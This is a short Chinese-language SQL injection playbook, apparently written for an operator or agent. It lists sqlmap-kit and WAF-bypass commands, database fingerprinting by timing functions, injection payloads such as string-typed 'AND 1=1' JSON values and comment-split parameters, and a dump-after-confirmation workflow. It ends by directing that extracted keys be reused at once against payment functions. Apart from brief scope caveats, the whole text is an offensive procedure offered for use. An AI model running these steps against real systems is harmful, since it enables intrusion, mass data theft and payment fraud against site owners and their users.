# 大爱仙尊 SQL 注入作业手法

> 杀招：`无底洞` · `sqli-manual`  
> 工具：`python3 炼蛊房/sqlmap_kit.py ladder`  
> WAF：`waf_sqli_bypass.py` 再 ladder  
> 专卡：GeoServer / Metabase / 网狐 TP5 登录盲注仍走各自卡

目标须在 scope。百万拖号 / 清库先问。过闸才 dump。

---

## 1. 立刻跑

```bash
python3 炼蛊房/sqlmap_kit.py ladder --url 'https://授权/?id=1' -p id --case <案>
# WAF 先变形
python3 炼蛊房/waf_sqli_bypass.py --url 'https://授权/?id=1' -p id --case <案>
```

产物：`案卷/sqlmap/` 或 kit 自己的目录。  
「报错有 SQL 语法」只算 L1。L2 = 布尔/时间可区分。L3 = 当前库名或一张表可列出。

---

## 2. 四刀

1. **钉点** — Query / JSON / Cookie / Header / 路径参数，一次一个  
2. **认库** — MySQL `SLEEP`、MSSQL `WAITFOR`、PG `pg_sleep`、Oracle `DBMS_PIPE`、SQLite 时间弱  
3. **过 WAF** — 先本库 `waf_sqli_bypass` / `sqlmap_kit ladder`，不要裸 `--dbs`  
4. **取证** — 过闸再 dump；二次注入要「写入再触发」两步都做

JSON 数字改字符串：`{"id":"1 AND 1=1"}`。注释拆参数：`a=1'/*&b=*/AND 1=1--`。

---

## 3. 交接

支付 / 登录盲注有专卡先专卡。注入出的密钥立刻回灌假支付，不要停在「有注入」。
